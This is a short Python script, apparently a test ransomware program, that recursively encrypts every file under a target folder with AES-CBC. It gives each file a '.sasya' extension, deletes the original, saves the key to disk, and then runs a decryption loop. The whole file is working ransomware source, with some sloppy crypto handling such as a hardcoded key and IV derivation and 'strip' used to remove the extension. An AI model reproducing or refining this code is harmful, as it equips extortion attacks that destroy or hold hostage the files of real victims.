from Crypto.Cipher import AES
from Crypto.Hash import SHA256 as sha
import os, glob, zipfile

KSIZE = 1024

keyPath = 'C:\\Users\\Yeeun\\'
startPath = 'C:\\Users\\Yeeun\\Desktop\\Ransom_Private\\Ransom\\test\*' # 암 / 복호화할 대상 경로
print(glob.iglob(startPath, recursive=True))

class myAES():
    def __init__(self, keytext, ivtext):
        hash = sha.new()
        hash.update(keytext.encode('utf-8'))
        key = hash.digest()
        self.key = key[:16]

        hash.update(ivtext.encode('utf-8'))
        iv = hash.digest()
        self.iv = iv[:16]
        print(self.key, self.iv)

    def makeEncInfo(self, filename):
        fillersize = 0
        filesize = os.path.getsize(filename)
        if filesize % 16 != 0:
            fillersize = 16 - filesize % 16

        filler = '0'*fillersize
        header = ' %d' %(fillersize)
        gap = 16 - len(header)
        header += '#' * gap

        return header, filler

    def enc(self, filename):
        encfilename = filename + '.sasya'
        header, filler = self.makeEncInfo(filename)
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        kk = open(keyPath + 'key.txt', 'w')
        kk.write(str(self.key))
        kk.close()

        h = open(filename, 'rb')
        hh = open(encfilename, 'wb+')
        enc = header.encode('utf-8')
        content = h.read(KSIZE)
        content = enc + content
        while content:
            if len(content) < KSIZE:
                content += filler.encode('utf-8')

            enc = aes.encrypt(content)
            hh.write(enc)
            content = h.read(KSIZE)

        h.close()
        hh.close()

    def dec(self, encfilename) :
        filename = encfilename.strip('.sasya')
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)

        h = open(filename, 'wb+')
        hh = open(encfilename, 'rb')

        content = hh.read(16)
        dec = aes.decrypt(content)
        header = dec.decode()
        fillersize = int(header.split('#') [0])

        content = hh.read(KSIZE)
        while content:
            dec = aes.decrypt(content)
            if len(dec) < KSIZE:
                if fillersize != 0:
                    dec = dec[:-fillersize]
            h.write(dec)
            content = hh.read(KSIZE)

        h.close()
        hh.close()


aesEnc = myAES('keytext', 'ivtext')
#Encrypts all files recursively starting from startPath
print(glob.glob(startPath,  recursive=True))

for filename in glob.glob(startPath, recursive=True): # 대상 경로를 재귀적 호출 사용
    print(filename)
    if 'key' in filename:
        pass
    elif(os.path.isfile(filename)): # 현재 파일이 파일일때
        print('Encrypting> ' + filename) # 파일명 출력
        aesEnc.makeEncInfo(filename)
        aesEnc.enc(filename) # Encrypt_file에 위에서 선언한 키값과 파일명을 인자로 호출
        os.remove(filename) # 현재파일을 제거 (encrypt_file 함수에서 새파일을 작성하였기에 기존파일을 제거해야함.)
        '''
    elif(os.path.isdir(filename)):
        f = str(dir) + '.zip'
        print(f)
        zipf = zipfile.ZipFile(f, 'w')
        zipf.write(dir, compress_type = zipfile.ZIP_DEFLATED)
        zipF.close()
        os.remove(filename)
        aesEnc.makeEncInfo(f)
        aesEnc.enc(f)
        '''


#Decrypts the files

for filename in glob.iglob(startPath, recursive=True): # 대상 경로를 재귀적 호출
    if(os.path.isfile(filename)): # 현재파일이 파일일 때
        fname, ext = os.path.splitext(filename) # 파일명과 확장자를 추출
        if (ext == '.sasya'): # 확장자가 .enc (암호화된 파일일 때)
            print('Decrypting> ' + filename) # 파일명 출력
            aesEnc.dec(filename) # 복호화 함수 실행
            '''
            filename.strip('.sasya')
            if '.zip' in filename:
                zipf = zipfile.ZipFile(filename)
                zipf.extractall(filename)
                os.remove(filename)
            '''
            #os.remove(filename) # 암호화됐던 파일을 제거 (마찬가지로 새파일을 작성하였기에 기존 파일을 제거해야함.)
